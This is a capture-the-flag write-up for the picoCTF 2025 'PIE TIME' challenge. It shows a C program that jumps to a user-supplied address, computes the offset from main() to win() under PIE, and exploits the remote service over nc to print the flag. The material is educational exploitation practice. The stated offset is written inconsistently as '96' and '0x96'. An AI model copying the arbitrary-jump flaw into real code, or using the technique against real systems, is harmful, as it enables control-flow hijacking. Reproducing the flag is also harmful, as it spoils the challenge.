Can you try to get the flag? Beware we have PIE!
# Solution

- Running `file` on `vuln`, we see that PIE is in fact enabled:
- But what is PIE anyways? It stands for **p**osition **i**ndependent **e**xecutable, which means that the machine code executes properly regardless of its memory address[1](https://blog.cbarkr.com/ctf/picoCTF/2025/PIE-TIME#user-content-fn-wiki). This is used to enable address space layout randomization (ASLR), which essentially means the binary will be loaded into a different memory address every time it is executed. Addresses in PIE are relative - that is, despite the binary being loaded into a random address, the offsets between parts of the binary will remain the same. This is what we’ll use to construct our payload.

```bash
~/Hentai/pico ❯ file vuln      
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped
```

```bash
~/Hentai/pico ❯ cat vuln.c  
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}%                
```

- So we have to somehow get to `win()` function.
- Even though due to PIE address are randomized but the different between `main()` and `win()` function will be constant.

```bash
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x00000000000010e0  __cxa_finalize@plt
0x00000000000010f0  putchar@plt
0x0000000000001100  puts@plt
0x0000000000001110  fclose@plt
0x0000000000001120  __stack_chk_fail@plt
0x0000000000001130  printf@plt
0x0000000000001140  fgetc@plt
0x0000000000001150  signal@plt
0x0000000000001160  setvbuf@plt
0x0000000000001170  fopen@plt
0x0000000000001180  __isoc99_scanf@plt
0x0000000000001190  exit@plt
0x00000000000011a0  _start
0x00000000000011d0  deregister_tm_clones
0x0000000000001200  register_tm_clones
0x0000000000001240  __do_global_dtors_aux
0x0000000000001280  frame_dummy
0x0000000000001289  segfault_handler
0x00000000000012a7  win
0x000000000000133d  main
0x0000000000001410  __libc_csu_init
0x0000000000001480  __libc_csu_fini
0x0000000000001488  _fini
```

- If we subtract the difference of `win` and `main` function that is `0x000000000000133d ` - `0x00000000000012a7`  from [Here](https://www.rapidtables.com/calc/math/hex-calculator.html?num1=0x000000000000133d%20&op=1&num2=0x00000000000012a7_) then the offset we get will be `96`.

```bash
 ❯ nc rescued-float.picoctf.net 49905
Address of main: 0x5b45950bd33d
Enter the address to jump to, ex => 0x12345: 
```

- In remote it says main is in `0x5b45950bd33d` so now if we subtract constant with it we should be able to get `win()` functions for it. 
- Also remote connection main function address changes everytime.
- When we `0x5b45950bd33d - 0x96` we get `5B45950BD2A7` which is `win` address.

```bash
~/Hentai/pico ❯ nc rescued-float.picoctf.net 49905
Address of main: 0x5b45950bd33d
Enter the address to jump to, ex => 0x12345: 5B45950BD2A7
Your input: 5b45950bd2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}
```

- `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}`

---
